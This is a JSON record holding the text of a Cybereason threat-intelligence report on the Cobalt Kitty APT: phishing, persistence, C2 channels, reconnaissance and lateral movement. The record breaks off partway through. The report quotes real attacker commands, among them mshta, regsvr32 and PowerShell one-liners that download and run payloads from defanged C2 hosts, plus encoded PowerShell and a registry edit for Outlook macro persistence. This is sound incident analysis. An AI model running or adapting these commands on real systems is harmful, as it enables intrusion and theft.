{
    "id": "82a28ac4-d3fb-43f6-9899-858f635720c3",
    "created_at": "2022-10-25T16:48:19.089383Z",
    "updated_at": "2025-03-27T02:16:58.181351Z",
    "deleted_at": null,
    "sha1_hash": "fd935612ea036144030f0ca7fce0810b09c6eec4",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-05-24T10:31:35Z",
    "file_modification_date": "2017-05-24T10:32:03Z",
    "file_size": 6578499,
    "plain_text": "# Operation Cobalt Kitty\n\n## Cybereason Labs Analysis\n\n##### By: Assaf Dahan\n\n\n-----\n\n# Operation Cobalt Kitty\n\n## Attack Lifecycle\n\n##### By: Assaf Dahan\n\n\n-----\n\n#### Table of Contents\n\n**Detailed attack lifecycle**\n\n**Penetration phase**\n\nFake Flash Installer delivering Cobalt Strike Beacon\nWord File with malicious macro delivering Cobalt Strike Beacon\nPost infection execution of scheduled task\n\n**Establishing foothold**\n\nWindows Registry\nWindows Services\nScheduled Tasks\nOutlook Persistence\n\n**C2 Communication**\n\nCobalt Strike Fileless Infrastructure (HTTP)\n\nC&C payloads\nCobalt strike Malleable C2 communication patterns\nVariant of Denis Backdoor using DNS Tunneling\nOutlook Backdoor Macro as C2 channel\nCustom NetCat\n\n**Internal reconnaissance**\n\nInternal Network Scanning\nInformation gathering commands\nVulnerability Scanning using PowerSploit\n\n**Lateral movement**\n\nObtaining credentials\n\nMimikatz\nGaining Outlook credentials\nPass-the-hash and pass-the-ticket\nPropagation via Windows Admin Shares\nWindows Management Instrumentation (WMI)\n\n©2017 Cybereason Inc. All rights reserved. 1\n\n\n-----\n\n#### Detailed attack lifecycle \n\nThe advanced persistent threat Operation Cobalt Kitty targeted a global corporation and was\ncarried out by highly skilled and very determined adversaries. This report provides a\ncomprehensive, step-by-step technical account of how the APT was carried out by the\nOceanLotus Group, diving into their work methods throughout APT lifecycle. Like other\n[reported APTs, this attack “follows” the stages of a classic attack lifecycle (aka cyber kill-chain),](https://en.wikipedia.org/wiki/Kill_chain#Computer_security_model)\nwhich consists of these phases:\n\n**1. Penetration**\n**2. Foothold and persistence**\n**3. Command & control and data exfiltration**\n**4. Internal reconnaissance**\n**5. Lateral movement**\n\n©2017 Cybereason Inc. All rights reserved. 2\n\n\n-----\n\n#### 1. Penetration phase\n\nThe penetration vector in this attack was social engineering, specifically spear-phishing attacks\nagainst carefully selected, high-profile targets in the company. Two types payloads were found\nin the spear-phishing emails:\n\n1. Link to a malicious site that downloads a fake Flash Installer delivering Cobalt Strike\n\nBeacon\n2. Word documents with malicious macros downloading Cobalt Strike payloads\n\n###### Fake Flash Installer delivering Cobalt Strike Beacon\n\nThe victims received a spear-phishing email using a pretext of applying to a position with the\ncompany. The email contained a link to a redirector site that led to a download link, containing a\nfake Flash installer. The fake Flash installer launches a multi-stage fileless infection process.\n[This technique of infecting a target with an fake Flash installer](http://zhuiri.360.cn/report/index.php/2015/05/29/482/?lang=en) is consistent with the OceanLotus\n[Group and has been documented in the past.](https://web.archive.org/web/20151013184335/http:/drops.wooyun.org/papers/6335)\n\n©2017 Cybereason Inc. All rights reserved. 3\n\n\n-----\n\n**Download Cobalt Strike payload - The fake Flash installer downloads an encrypted payload**\nwith shellcode from the following URL: hxxp://110.10.179(.)65:80/ptF2\n\n###### Word File with malicious macro delivering Cobalt Strike Beacon\n\nOther types of spear-phishing emails contained Microsoft Office Word attachments with different\nfile names, such as CV.doc and Complaint_Letter.doc.\n\nThe malicious macro creates two scheduled tasks that download files camouflaged as “.jpg”\nfiles from the C&C server:\n\n**Scheduled task 1:**\n\n©2017 Cybereason Inc. All rights reserved. 4\n\n\n-----\n\n**Scheduled task 2:**\n\nThe two scheduled tasks are created on infected Windows machines:\n\n###### Post infection execution of scheduled task\n\n**Example 1: Fileless downloader delivers Cobalt Strike Beacon**\n###### The purpose of the scheduled task is to download another payload from the C&C server: \n**_schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:'<script_**\n_language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\\\">code close</script>'\"_\n_/mo 15 /F_\n\n©2017 Cybereason Inc. All rights reserved. 5\n\n\n-----\n\nThe content of the “microsoftp.jpg” is a script that combines vbscript and PowerShell:\n**SHA-1: 23EF081AF79E92C1FBA8B5E622025B821981C145**\n\nThat downloads and executes an additional payload from the same server with a slightly\ndifferent name “microsoft.jpg”.\n\n**Obfuscated PowerShell delivering Cobalt Strike Beacon - The contents of the**\n[“microsoft.jpg” file is, in fact, an obfuscated PowerShell payload (obfuscated with Daniel](https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Invoke-Obfuscation.ps1)\n[Bohannon’s Invoke-obfuscation).](https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Invoke-Obfuscation.ps1)\n\nmicrosoft.jpg, SHA-1: C845F3AF0A2B7E034CE43658276AF3B3E402EB7B\n\nQuick memory analysis of the payload reveals that it is a Cobalt Strike Beacon, as seen in the\nstrings found in the memory of the PowerShell process:\n\n**Example 2: Additional Cobalt Strike delivery method**\n\nCybereason observed another method of Cobalt Strike Beacon delivery in infected machines.\n\n©2017 Cybereason Inc. All rights reserved. 6\n\n\n-----\n\nOnce the initial PowerShell payload is downloaded from the server, it will pass an obfuscated\nand XOR’ed PowerShell payload to cmd.exe:\n\nThe payload is decrypted to the following PowerShell downloader one-liner:\n**IEX ((new-object net.webclient).downloadstring(‘hxxp://27.102.70(.)211:80/image.jpg'))**\n\nThe PowerShell process will then download the new ‘image.jpg’ payload, which is actually\nanother obfuscated PowerShell payload:\n**image.jpg - 9394B5EF0B8216528CED1FEE589F3ED0E88C7155**\n\n©2017 Cybereason Inc. All rights reserved. 7\n\n\n-----\n\nOnce executed by PowerShell, the embedded script was identified as Cobalt Strike Beacon:\n\n#### 2. Establishing foothold\n\nGaining persistence is one of the attack’s most important phases. It insures that the malicious\ncode will run automatically and survive machine reboots.\n\nThe attackers used trivial but effective persistence techniques to ensure that their malicious\ntools executed constantly on the infected machines. Those techniques consist of:\n\n      - **Windows Registry Autorun**\n\n      - **Windows Services**\n\n      - **Windows Scheduled Tasks**\n\n©2017 Cybereason Inc. All rights reserved. 8\n\n\n-----\n\n###### 2.1. Windows Registry\n\nThe attackers used the Windows Registry Autorun to execute VBScript and PowerShell scripts\nresiding in the ProgramData folder, which is hidden by default:\n\n_HKU\\[redacted]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Java Update Schedule Check_\n_HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\syscheck_\n_HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\DHCP Agent_\n_HKU\\[redacted]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activation Checker_\n_HKU\\[redacted]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Update_\n\nExamples of the values of the above registry keys:\n\nThe purpose of those .vbs scripts was to launch Cobalt Strike PowerShell scripts mainly\nconsisting of Cobalt Strike Beacon. Some of the files found in ProgramData appear to be .txt\nfiles. However, their content is VBscript.\n\n[In addition, the attackers used NTFS Alternate Data Stream](http://techgenix.com/alternate_data_streams/) to hide their payloads. This is a\nrather old trick to hide data from the unsuspecting users and security solutions.\n\nThe code inside the ‘hidden’ .txt file launches a PowerShell process with a base64-encoded\ncommand:\n\nThis PowerShell commands decodes to:\n**_Invoke-Expression C:\\ProgramData\\Microsoft\\SndVolSSO.ps1_**\n\nThis launches a PowerShell script, which loads an obfuscated and encoded Cobalt Strike’s\nbeacon payload:\n\n©2017 Cybereason Inc. All rights reserved. 9\n\n\n-----\n\n###### 2.2. Windows Services\n\nThe attackers created and/or modified Windows Services to ensure the loading of the\nPowerShell scripts on the compromised machines. These scripts are mostly PowerShellencoded Cobalt Strike’s Beacon payloads:\n\n###### Backdoor exploits DLL hijacking against Wsearch Service\n\n[According to Microsoft’s documentation, Windows Search Service (Wsearch), which is a default](https://msdn.microsoft.com/en-us/library/windows/desktop/cc678934(v=vs.85).aspx)\ncomponent in Windows OS, runs automatically. Once Wsearch starts, it launches\nSearchIndexer.exe and SearchProtocolHost.exe applications. These applications are vulnerable\n[to “Phantom DLL Hijacking” and were exploited in other targeted attacks.](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)\n\nThe attackers placed a fake “msfte.dll” under the system32 folder, where the vulnerable\n\n©2017 Cybereason Inc. All rights reserved. 10\n\n\n-----\n\napplications reside by default. This ensured that the fake “msfte.dll” would be loaded each time\nWsearch launched these applications:\n\n[For further details about the backdoor, please refer to Cobalt Kitty Attacker’s Arsenal: Deep dive](https://www2.cybereason.com/asset/59:cobalt-kitty-attackers-arsenal)\ninto the tools used in the APT.\n\n###### 2.3. Scheduled Tasks\n\nThe attackers used scheduled tasks to ensure the malicious payloads ran in predetermined\ntimeframes:\n\n###### PowerShell Loader:\n\n**Google Update:**\n\n©2017 Cybereason Inc. All rights reserved. 11\n\n\n-----\n\nThe attackers exploited a DLL hijacking vulnerability in a legitimate Google Update binary,\nwhich was deployed along with a malicious DLL (goopdate.dll). By default, GoogleUpdate.exe\ncreates a scheduled task that checks if a new version of Google products is available.\n\nAs a result, each time GoogleUpdate.exe application ran, it automatically loaded the malicious\ngoopdate.dll:\n\nFor further details about the backdoor, please refer to Cobalt Kitty Attacker’s Arsenal: Deep dive\ninto the tools used in the APT.\n\n###### 2.4. Outlook Persistence\n\nThe attackers used a malicious Outlook backdoor macro to communicate with the C2 servers\nand exfiltrate data. To make sure the malicious macro ran, they edited a specific registry value\nto create persistence:\n\n###### /u /c REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14\\Outlook\" /v \"LoadMacroProviderOnBoot\" /f /t REG_DWORD /d 1\n\n©2017 Cybereason Inc. All rights reserved. 12\n\n\n-----\n\n#### 3. C2 Communication \n\nThe attackers used different techniques and protocols to communicate with the C&C servers:\n\n###### 3.1. Cobalt Strike Fileless Infrastructure (HTTP)\n\nThe attackers chose to implement a multi-stage payload delivery infrastructure in the first phase\nof the attack. The motivation for fileless operation is clear: this approach has a low forensic\nfootprint since most of the payloads are downloaded from the C&C and executed in-memory\nwithout touching the disk.\n\n###### Multi-Stage Payload Delivery\n\n©2017 Cybereason Inc. All rights reserved. 13\n\n\n-----\n\n###### PowerShell downloader\nA PowerShell one-liner downloads and executes a PowerShell payload from the C&C server.\n\n###### Regsvr32.exe downloader command (COM Scriptlet)\nThe fileless infrastructure also used another type of downloader, which is based on COM\n[scriptlets (.sct). This technique is well documented and has been used extensively in the last](http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html)\nyear.\n\nThe attackers downloaded COM scriptlets using regsvr32.exe:\n_regsvr32 /s /n /u /i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll_\n\n###### C&C payloads\n\nFollowing are a few examples of C&C payloads used as part of the fileless payload delivery\ninfrastructure.\n\n**Example 1: Second Stage PowerShell Script**\nThis .txt file is actually a base64-encoded PowerShell payload that contains a shellcode:\n\n©2017 Cybereason Inc. All rights reserved. 14\n\n\n-----\n\n**File Name: login.txt, SHA-1: 9f95b81372eaf722a705d1f94a2632aad5b5c180**\n\nThe shellcode downloads additional payload from the URL: hxxp://food(.)letsmiles(.)org/9niL\n\n©2017 Cybereason Inc. All rights reserved. 15\n\n\n-----\n\n**Example 2: Second Stage COM Scriptlet Payload**\nThe regsvr32.exe downloader command downloads the following COM scriptlet, which contains\nan embedded shellcode:\n\n**File Name: pic.png, SHA-1: f3e27ad08622060fa7a3cc1c7ea83a7885560899**\n\nThe shellcode downloads a payload from the following URL:\n_hxxp://45(.)114.117.137/eXYF_\n\n**Final payload: Cobalt Strike Beacon**\nAnalysis of the final stage payloads (such as “9niL” / “eXYF”) clearly shows that they are Cobalt\nStrike Beacons:\n\n©2017 Cybereason Inc. All rights reserved. 16\n\n\n-----\n\n###### 3.2. Cobalt strike Malleable C2 communication patterns\n\nAnother confirmation that the attackers used Cobalt Strike’s infrastructure came from the\n[analysis of the network traffic. The analyzed traffic matched Cobalt Strike’s Malleable C2.](https://www.cobaltstrike.com/help-malleable-c2)\nThe attackers used the Amazon, Google Safe Browsing, Pandora and OSCP profiles in this\nattack, all of which are publicly available in Github:\n[https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/safebrowsing.profile](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/safebrowsing.profile)\n[https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile)\n[https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/pandora.profile](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/pandora.profile)\n[https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/oscp.profile](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/oscp.profile)\n\nA .pcap file that was recorded during the execution of the Cobalt Strike payloads clearly shows\nthe usage of the Malleable C2 profiles, in that case - the “safebrowsing.profile”:\n\n©2017 Cybereason Inc. All rights reserved. 17\n\n\n-----\n\nAnother example is the Amazon profile, generated by another Cobalt Strike payload:\n\n###### 3.3. Variant of Denis Backdoor using DNS Tunneling\n\nDuring the investigation, an analysis of the backdoor’s traffic revealed that the attackers\n[implemented DNS tunneling channel for C2 communication and data exfiltration. The DNS](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152)\ntunneling channel was observed being used by the PowerShell payloads as well as the fake\nDLLs (msfte.dll and goopdate.dll). In attempt to disguise the real IP/domain of the C&C server,\nthe backdoor communicates with the following DNS servers instead of communicating directly\nwith the C&C servers:\n**Google DNS server: 8.8.8.8**\n**OpenDNS server: 208.67.222.222**\n\nBy communicating with known DNS servers, the attackers ensured that the backdoor’s traffic\nwill not be filtered by firewalls and other security products since it’s unlikely for most\norganizations to block OpenDNS and Google’s DNS servers.\n\nExample of DNS tunneling can be seen in this instance of ARP.exe that was spawned by\nsearchindexer.exe, which loaded the fake msfte.dll:\n\n©2017 Cybereason Inc. All rights reserved. 18\n\n\n-----\n\nUpon inspection of the DNS traffic, the real C&C domain is revealed inside the DNS queries:\n**Real C&C domain: z.teriava(.)com**\n\n©2017 Cybereason Inc. All rights reserved. 19\n\n\n-----\n\n###### 3.4. Outlook Backdoor Macro as C2 channel\n\nDuring the third phase of the attack, the attackers used an advanced technique that turned\nMicrosoft Outlook into a C2 channel by replacing the email program’s original VbaProject.OTM\nmacro container with a malicious one containing a backdoor functionality. Using this backdoor,\nthe attackers managed to send system commands via emails from a Gmail address and\nexfiltrate data.\n\nThe decoded malicious macro is loaded after boot and constantly looks for incoming emails\ncontaining the strings $$cpte and $$ecpte.\n\nThe attacker’s command embed their commands between those two strings.\n\n©2017 Cybereason Inc. All rights reserved. 20\n\n\n-----\n\nThe same technique was used to steal and exfiltrate sensitive company data, as seen in the\nscreenshots below:\n\nOutlook spawns two cmd.exe shells:\n\nThe command lines of the following cmd.exe instances clearly show that the attackers were\ngathering information and exfiltrating specific documents:\n\n_cmd.exe /C “ ipconfig > %temp%.log.txt_\n_cmd.exe /C “ c:\\Users\\[redacted]\\Desktop\\[Redacted_File_name].xls %temp%”_\n\n###### 3.5.  Custom NetCat\n\nAnother C2 communication tool used by the attackers was a custom version of the famous\n[Netcat](http://netcat.sourceforge.net/) [tool (aka, tcp/ip Swiss Army knife) from GitHub. Using the previously installed backdoor,](https://github.com/diegocr/netcat)\nthe attackers uploaded and executed this customized version of NetCat on several machines:\n\n©2017 Cybereason Inc. All rights reserved. 21\n\n\n-----\n\nThe NetCat binary was renamed “kb-10233.exe”, masquerading as a Windows update, in order\nto look less suspicious. The sample’s SHA-1 hash is:\nc5e19c02a9a1362c67ea87c1e049ce9056425788,\n[which is the exact match to the customized version of Netcat found on Github.](https://github.com/diegocr/netcat)\n\nIn addition, examining the command line arguments reveals that the attackers also were aware\nof the proxy server deployed in the environment and configured the IP and port accordingly to\nallow them external connection to the C&C server:\n\n#### 4. Internal reconnaissance\n\nAfter the attackers established a foothold on the compromised machines and established C2\ncommunication, they scanned the network, enumerated machines and users and gathered more\ninformation about the environment.\n\n###### 4.1. Internal Network Scanning\n\nDuring the attack, Cybereason observed network scanning against entire ranges as well as\nspecific machines. The attackers were looking for open ports, services, OS finger-printing and\ncommon vulnerabilities:\n\n©2017 Cybereason Inc. All rights reserved. 22\n\n\n-----\n\nCybereason detected the following PowerShell instance with an Base64 encoded command:\n_powershell -nop -exec bypass -EncodedCommand_\n_\"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbA_\n_BpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB_\n_0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQANwA5ADIALwAnACkAOwAg_\n_AFMAYwBhAG4AIAAxADkAMgAuADEANgA4AC4AOAAuADAALQAyADUANAAgAC0AbwBzA_\n_CAALQBzAGMAYQBuAHAAbwByAHQAIAAgACAAIAAgACAAIAAgACAAIAAgAA==\"_\n\nDecoded Base64 PowerShell command:\n_IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:24792/'); Scan 192.168.x.x-_\n_254 -os –scanport_\n\nAs the screenshot below shows, the attackers launched port scanning against common ports:\n\n###### 4.2. Information gathering commands\n\nThe attackers used several tools built into the Windows OS to gather information on the\nenvironment’s network and its users. Those tools included netsh, ipconfig, netstat, arp, net\nuser/group/localgroup, nslookup and Windows Management Instrumentation (WMI).\n\nThe following are a few examples of command line arguments that were used to gather\n###### information on the infected hosts and the network:  Command Purpose\nnet localgroup administrators Enumerating admin users\n\n©2017 Cybereason Inc. All rights reserved. 23\n\n|Command|Purpose|\n|---|---|\n|net localgroup administrators|Enumerating admin users|\n\n\n-----\n\nWMIC path win32_process get Searching for the process ID of OUTLOOK, in\nCaption,Processid,Commandline | findstr order to restart it, so it would load the\nOUTLOOK malicious vbaproject.otm file\n\n###### 4.3. Vulnerability Scanning using PowerSploit\n\nOnce the Cobalt Strike Beacon was installed, the attackers attempted to find privilege escalation\nvulnerabilities that they could exploit on the compromised hosts. The following example shows a\ncommand that was run by a spawned PowerShell process:\n\n_powershell -nop -exec bypass -EncodedCommand_\n_\"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb_\n_gB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AM_\n_QAyADcALgAwAC4AMAAuADEAOgAyADUAMwA4AC8AJwApADsAIABJAG4AdgBvAGsAZQAtAEEAbA_\n\n©2017 Cybereason Inc. All rights reserved. 24\n\n|net group \"Domain Controllers\" /domain|Enumerating DC servers|\n|---|---|\n|klist tickets|Displaying Kerberos Tickets|\n|dir \\\\[IP_redacted]\\c$|Displaying files on net share|\n|netstat -anpo tcp|Displaying TCP connections|\n|ipconfig /all|Displaying Network adapter information|\n|ping [hostname_redacted] -n 1|Pinging a host|\n|net view \\\\[redacted] /all|Shows all shares available, including administrative shares like C$ and admin$|\n|netsh wlan show interface|Displaying Wireless adapter properties|\n|route print|Displaying a list of persistent routes|\n|WHOAMI|Outputs the owner of the current login session (local, admin, system)|\n|WMIC path win32_process get Caption,Processid,Commandline | findstr OUTLOOK|Searching for the process ID of OUTLOOK, in order to restart it, so it would load the malicious vbaproject.otm file|\n\n\n-----\n\n_BsAEMAaABlAGMAawBzAA==\"_\n\nThe encoded command decodes to IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:2538/'); Invoke-AllChecks\n\n[The Invoke-AllChecks command is indicative to the PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) privilege escalation “scanner”,\n[which is part of the PowerSploit project.](https://github.com/PowerShellMafia/PowerSploit)\n\n#### 5. Lateral movement\n\nThe attackers compromised more than 35 machines, including the Active Directory server, by\nusing common lateral movement techniques including pass-the-hash and pass-the-ticket and\nWindows applications such as net.exe and WMI.\n\n###### 5.1. Obtaining credentials\n\nBefore the attackers could spread to new machines, they had to obtain the necessary\ncredentials, such as passwords, NTLM hashes and Kerberos tickets. To obtain these\ncredentials, the attackers used various, known tools to dump locally stored credentials.\n\n[The attackers mainly used Mimikatz, which was customized in a way that ensured antivirus](https://github.com/gentilkiwi/mimikatz)\nproducts wouldn’t detect it.\n\nOther tools used to obtain credentials included:\n\n  - **[Modified Window’s Vault Password Dumper - A PowerShell version of a known](http://www.oxid.it/downloads/vaultdump.txt)**\n\n[password dumping tool, which was modified in order to accommodate additional](http://www.oxid.it/downloads/vaultdump.txt)\nfunctionality and to evade antivirus.\n\n  - **[Hook Password Change - Modified version of the a tool found on Github. This tool](https://github.com/clymb3r/Misc-Windows-Hacking/blob/master/HookPasswordChange/HookPasswordChange/HookPasswordChange.cpp)**\n\nalerts the attackers if passwords are changed by hooking specific functions in the\nWindows OS. This provided the attackers a workaround to the frequent password resets\nordered by the IT department during the attack.\n\n###### 5.1.1. Mimikatz\n\nThe main tool used to obtain credentials from the compromised machines was a obfuscated and\nsometimes slightly modified versions of [Mimikatz, a known password dumping tool, whose](http://blog.gentilkiwi.com/mimikatz)\nsource code is freely available on [GitHub. The attackers used at least 14 different versions of](https://github.com/gentilkiwi/mimikatz)\nMimikatz using different techniques to evade antivirus detection:\n\n©2017 Cybereason Inc. All rights reserved. 25\n\n\n-----\n\n[The following screenshot shows examples of the command line arguments indicative of](https://github.com/gentilkiwi/mimikatz)\n[Mimikatz](https://github.com/gentilkiwi/mimikatz) that were that were used in the attack:\n\n###### 5.1.2. Gaining Outlook credentials\n\nIn addition to Windows account credentials, the attackers also targeted the Outlook credentials\n[of selected high-profile employees. The attackers modified a known password dumper](http://www.oxid.it/downloads/vaultdump.txt) in order\nto make it more Outlook-oriented. The binary version of this tool is detected by most antivirus\nvendors so the attackers ported it to PowerShell, making it stealthier. However, in order to use\nthe PowerShell version, the attackers had to overcome measures that were put in place to\nrestrict PowerShell execution.\n\n[The attackers used a modified version of a publicly available tool called PSUnlock](https://github.com/p3nt4/PSUnlock) to bypass the\nPowerShell execution restrictions. Here’s an example of this tool being used:\n_rundll32 C:\\ProgramData\\PShdll35.dll,main -f C:\\ProgramData\\doutlook.ps1_\n\nThe purpose of the doutlook.ps1 (SHA-1: ebdd6059da1abd97e03d37ba001bad4aa6bcbabd)\n\n©2017 Cybereason Inc. All rights reserved. 26\n\n\n-----\n\nscript becomes very clear when observing the memory strings of the Rundll32.exe process:\n\n###### 5.2. Pass-the-hash and pass-the-ticket\n\nCybereason detected multiple lateral movement techniques that were used during the attack.\n[The attackers successfully carried out pass-the-hash and](https://en.wikipedia.org/wiki/Pass_the_hash) [pass-the-ticket attacks using stolen](https://attack.mitre.org/wiki/Technique/T1097)\nNTLM hashes and Kerberos tickets from compromised machines.\n\nThe attackers managed to compromise a domain admin account. Using the compromised\nadministrative account, the attackers moved laterally, deployed their tools and mass-infected\nother machines. More instances of lateral movements were observed using other compromised\naccounts during the different stages of the attack.\n\n###### Example 1: Deploying Mimikatz on remote machines\nThe attackers deployed a customized Mimikatz using stolen credentials from an administrative\naccount, which they used to carry out a pass-the-hash attack:\n\n©2017 Cybereason Inc. All rights reserved. 27\n\n\n-----\n\n###### Example 2: Gaining remote access using pass-the-ticket attack \n\n 5.3. Propagation via Windows Admin Shares\n\nAnother lateral movement technique that was used extensively in the attack involved using the\n[Windows Admin Shares via the built-in Windows “net.exe” tool. This technique uses Windows’](https://attack.mitre.org/wiki/Technique/T1077)\nhidden network shares, which administrators can only access and use to copy their tools to\nremote machines and execute them.\n\n©2017 Cybereason Inc. All rights reserved. 28\n\n\n-----\n\nThe screenshot below show an example of this technique being used in the attack:\n\n###### 5.4.  Windows Management Instrumentation (WMI)\n\n[The attackers used a well-documented lateral movement technique](https://attack.mitre.org/wiki/Technique/T1047) that abuses [Windows](https://msdn.microsoft.com/en-us/library/aa394582.aspx)\n[Management Instrumentation (WMI) and “Net User” commands to deploy their tools on remote](https://msdn.microsoft.com/en-us/library/aa394582.aspx)\nmachines.\n\n###### Example: Infecting other machines with Denis backdoor\nUsing WMI and the stolen credentials, the attackers copied the backdoor DLL (msfte.dll) to the\ntarget machine:\n\nTo ensure that the fake msfte.dll will be loaded by SearchIndexer.exe / SearchProtocolHost.exe\nprocesses, the attackers had to restart the Wsearch service.\n\n###### Stopping the Wsearch service\n\n Starting the Wsearch service\n\n©2017 Cybereason Inc. All rights reserved. 29\n\n\n-----\n\nOnce the service is started again, the malicious msfte.dll will be loaded by the\nsearchindexer.exe application:\n\n©2017 Cybereason Inc. All rights reserved. 30\n\n\n-----\n\n# Operation Cobalt Kitty\n\n## Attackers' Arsenal\n\n##### By: Assaf Dahan\n\n\n-----\n\n#### Table of Contents\n\nIntroduction\n\nMeet Denis the Menace: The APT’s main backdoor\n\nDescription\n3-in-1: Phantom DLL hijacking targeting Microsoft’s Wsearch\nFunctionality\nStatic analysis\nDynamic analysis\n\nVariation in process injection routines\nThe backdoor code\nC2 communication\n\nSecond backdoor: “Goopy”\n\nAnalysis of Goopy\n\nDLL side loading against legitimate applications\n\nOutlook backdoor macro\n\nCobalt Strike\n\nCOM Scriptlets (.sct payloads)\n\nObfuscation and evasion\n\nDon’t-Kill-My-Cat\nInvoke-obfuscation (PowerShell Obfuscator)\nPowerShell bypass tool (PSUnlock)\n\nCredential dumpers\n\nMimikatz\nGetPassword_x64\nCustom “HookPasswordChange”\nCustom Outlook credential dumper\nCustom Windows credential dumper\n\nModified NetCat\n\nCustom IP check tool\n\n\n-----\n\n#### Introduction\n\nDuring the investigation, Cybereason recovered over 80 payloads that were used during the\nfour stages of the attack. Such a large number of payloads is quite unusual and further\ndemonstrates the attackers’ motivation to stay under the radar and avoid using the same\npayloads on compromised machines. At the time of the attack, **only two payloads had file**\n**hashes known to threat intelligence engines, such as VirusTotal.**\n\n[This arsenal is consistent with previous documentations](https://read01.com/yxjnL2.html) [of the OceanLotus Group. But it also](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n**includes new custom tools that were not publicly documented in APTs carried out either by**\nthe OceanLotus Group or by threat actors.\n\nThe payloads can be broken down into three groups:\n\n**Payload type** **Total** **Main payloads** **Previously**\n**number** **reported being**\n\n**used by**\n**OceanLotus?**\n\n**Binary files** 46 - Variant of the Denis Backdoor (msfte.dll) No**\n(.exe and .dll - Goopy Backdoor (goopdate.dll) No**\n\n                - Cobalt Strike's Beacon Yes\n\nfiles)\n\n                - Mimikatz Yes\n\n              - GetPassword_x64 No\n\n                - PSUnlock No\n\n                - NetCat No\n\n**found on** - HookPasswordChange No\n**compromised** - Custom Windows Credential Dumper No\n**machines** - Custom IP tool No\n\n**Scripts** 24 - Backdoor - PowerShell version No**\n(PowerShell + - Outlook Backdoor (Macro) No**\nVBS) - Cobalt Strike Downloaders / Loaders / Yes\n\nStagers\n\n**found on** - Cobalt Strike Beacon Yes\n**compromised** - Custom Windows Credential Dumper No\n**machines** - Custom Outlook Credential Dumper No\n\n                - Mimikatz Yes\n\n                - Invoke-Obfuscation (PowerShell Obfuscator) Yes\n\n                - Don’t-Kill-My-Cat (Evasion/Obfuscation Too) Yes\n\n**C&C** 18 - Cobalt Strike Downloaders / Stagers Yes\n**Payloads** - Cobalt Strike Beacon Yes\n\n                - COM scriptlets (downloaders) Yes\n\n**[** OceanLotus is said to use tools with similar capabilities, however, no public documentation is available to](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)**\n**determine whether the tools are the same.**\n\n|Payload type|Total number|Main payloads|Previously reported being used by OceanLotus?|\n|---|---|---|---|\n|Binary files (.exe and .dll files) **found on compromised machines|46|● Variant of the Denis Backdoor (msfte.dll) ● Goopy Backdoor (goopdate.dll) ● Cobalt Strike's Beacon ● Mimikatz ● GetPassword_x64 ● PSUnlock ● NetCat ● HookPasswordChange ● Custom Windows Credential Dumper ● Custom IP tool|No** No** Yes Yes No No No No No No|\n|Scripts (PowerShell + VBS) **found on compromised machines|24|● Backdoor - PowerShell version ● Outlook Backdoor (Macro) ● Cobalt Strike Downloaders / Loaders / Stagers ● Cobalt Strike Beacon ● Custom Windows Credential Dumper ● Custom Outlook Credential Dumper ● Mimikatz ● Invoke-Obfuscation (PowerShell Obfuscator) ● Don’t-Kill-My-Cat (Evasion/Obfuscation Too)|No** No** Yes Yes No No Yes Yes Yes|\n|C&C Payloads|18|● Cobalt Strike Downloaders / Stagers ● Cobalt Strike Beacon ● COM scriptlets (downloaders)|Yes Yes Yes|\n\n\n-----\n\n###### Meet Denis the Menace: The APT’s main backdoor\n\n Description\n\nThe main backdoor was introduced by the attackers during the second stage of the attack, after\ntheir PowerShell infrastructure was detected and shut down. Cybereason spotted the main\n**backdoor in in December 2016:**\n\n[This backdoor was dubbed “Backdoor.Win32.Denis” by Kaspersky, which published their](https://securelist.com/blog/research/78203/use-of-dns-tunneling-for-cc-communications/)\nanalysis of it in March 2017. However, quite possibly, the is evidence of this backdoor being\nused “in-the-wild” [back in August 2016. At the time of the attack, the backdoor was not](https://virustotal.com/en/file/087ef9f7ce4681d49c6fa8842785fedef21461f160a34fc37c75fed26ddfa91e/analysis/)\npreviously known or publicly analyzed in the security community. The backdoor used in the\nattack is quite different from the samples analyzed by Kaspersky and other samples caught “inthe-wild”:\n\n|Col1|Cobalt Kitty “Denis” Variants|Backdoor.Win32.Denis|\n|---|---|---|\n|File Type|.dll + 